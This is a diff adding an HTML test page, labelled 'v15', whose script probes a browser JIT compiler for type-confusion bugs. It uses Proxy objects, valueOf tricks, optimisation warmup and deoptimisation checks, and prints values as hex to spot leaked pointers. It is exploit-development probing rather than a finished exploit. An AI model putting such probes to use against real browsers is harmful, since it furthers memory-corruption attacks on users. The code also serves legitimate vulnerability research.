@@ -1,0 +1,153 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>LOADING</title></head>
+<body><h3>v15</h3>
+<pre id="log" style="font-size:10px;background:#111;color:#0f0;padding:8px;max-height:700px;overflow:auto;white-space:pre-wrap;"></pre>
+<script>
+function log(m){let e=document.getElementById('log');if(e)e.innerHTML+=m+'\n';document.title='['+m.substring(0,50)+']';}
+var cv=new ArrayBuffer(8);var cf=new Float64Array(cv);var cb=new BigInt64Array(cv);
+function dtoi(f){cf[0]=f;return cb[0];}
+
+function fuzz(){
+  log('[*] v15 — Proxy JIT confusion deep investigation');
+
+  // Precise test: JIT-compiled function with proxy that changes type after warmup
+  let switchAt=0;
+  let handler={
+    get(t,p){
+      if(p==='length') return t.length;
+      if(p===Symbol.iterator) return undefined; // force indexed access
+      let idx=Number(p);
+      if(!isNaN(idx)){
+        if(switchAt>0 && idx===0) switchAt--;
+        if(switchAt===1){
+          // Return a double array instead of a smi/double
+          return [1.1,2.2,3.3]; // object, not number
+        }
+        return t[idx];
+      }
+      return Reflect.get(t,p);
+    }
+  };
+
+  // Test 1: Function typed for doubles, feed it object via proxy
+  log('\n=== JIT type confusion: double→object ===');
+  function sumArr(arr){
+    let s=0;
+    for(let i=0;i<3;i++) s+=arr[i]; // JIT sees doubles
+    return s;
+  }
+  let realArr=[1.1,2.2,3.3];
+  // Warmup with real doubles
+  for(let i=0;i<100000;i++) sumArr(realArr);
+  log('[+] Warmup done, result='+sumArr(realArr));
+
+  // Now use proxy that returns object on index 0
+  switchAt=3; // will switch on 3rd call
+  let proxy=new Proxy(realArr,handler);
+  let results=[];
+  for(let i=0;i<10;i++){
+    switchAt=i===5?2:0; // trigger on 6th iteration
+    let r=sumArr(proxy);
+    results.push(r);
+    if(r!==6.6 && typeof r==='number'){
+      log('[+] ANOMALY at i='+i+': result='+r+' (expected 6.6)');
+      log('[+] As hex: 0x'+(dtoi(r)).toString(16));
+    }
+  }
+  log('[+] Results: '+results.join(', '));
+
+  // Test 2: More direct — return {valueOf} from proxy, see if JIT uses it raw
+  log('\n=== JIT valueOf confusion ===');
+  let magicObj={valueOf(){return 0xCAFE;}, toString(){return 'evil';}};
+  let handler2={
+    get(t,p){
+      if(p==='length') return 3;
+      let i=Number(p);
+      if(!isNaN(i)){
+        if(i===0 && fuzz.trick) return magicObj;
+        return t[i];
+      }
+      return Reflect.get(t,p);
+    }
+  };
+  fuzz.trick=false;
+  let proxy2=new Proxy([10,20,30],handler2);
+
+  function sumProxy(arr){
+    let a=arr[0], b=arr[1], c=arr[2];
+    return a+b+c;
+  }
+  // Warmup
+  for(let i=0;i<100000;i++) sumProxy([10,20,30]);
+  log('[+] Warmup: '+sumProxy([10,20,30]));
+  // Now trick it
+  fuzz.trick=true;
+  for(let i=0;i<10;i++){
+    let r=sumProxy(proxy2);
+    if(r!==60){
+      log('[+] valueOf confusion: r='+r+' type='+typeof r);
+      // If r contains a pointer or unexpected value, we have type confusion
+      if(typeof r==='string') log('[+] Got string: "'+r+'"');
+      if(typeof r==='number' && r!==0xCAFE+20+30){
+        log('[+] UNEXPECTED numeric: '+r+' hex=0x'+(r>>>0).toString(16));
+      }
+    }
+  }
+  fuzz.trick=false;
+
+  // Test 3: Array map with proxy — force JIT to speculate on element types
+  log('\n=== map+proxy type speculation ===');
+  function mapDouble(arr){
+    return arr.map(x=>x*2);
+  }
+  let dblArr=[1.1,2.2,3.3,4.4];
+  for(let i=0;i<50000;i++) mapDouble(dblArr);
+  log('[+] map warmup done');
+
+  let handler3={
+    get(t,p){
+      if(p==='length') return 4;
+      if(p==='map') return Array.prototype.map;
+      if(p==='constructor') return Array;
+      let i=Number(p);
+      if(!isNaN(i)){
+        if(fuzz.mapTrick&&i===2) return {}; // object instead of double
+        return t[i];
+      }
+      return Reflect.get(t,p);
+    }
+  };
+  fuzz.mapTrick=false;
+  let proxy3=new Proxy(dblArr,handler3);
+  fuzz.mapTrick=true;
+  try{
+    let mapped=mapDouble(proxy3);
+    log('[+] map result: '+JSON.stringify(mapped).substring(0,100));
+    for(let i=0;i<mapped.length;i++){
+      if(typeof mapped[i]!=='number'){
+        log('[+] Non-number in mapped['+i+']: type='+typeof mapped[i]+' val='+String(mapped[i]));
+      }
+    }
+  }catch(e){log('[!] map: '+e.message);}
+
+  // Test 4: Check JIT deopt behavior — does deopt reveal uninitialized memory?
+  log('\n=== Deopt memory check ===');
+  function deoptMe(x){
+    let arr=[1.1,2.2,3.3]; // PACKED_DOUBLE_ELEMENTS
+    if(typeof x==='object') return arr; // force deopt
+    return arr[0]+arr[1]+arr[2]+x;
+  }
+  for(let i=0;i<100000;i++) deoptMe(1.0);
+  // Trigger deopt
+  let deoptResult=deoptMe({});
+  log('[+] Deopt result type: '+typeof deoptResult+' isArray: '+Array.isArray(deoptResult));
+  if(Array.isArray(deoptResult)){
+    for(let i=0;i<deoptResult.length;i++){
+      let v=dtoi(deoptResult[i]);
+      log('[+] deopt arr['+i+']='+deoptResult[i]+' hex=0x'+v.toString(16));
+    }
+  }
+
+  log('\n[*] v15 done.');
+}
+setTimeout(fuzz,500);
+</script></body></html>
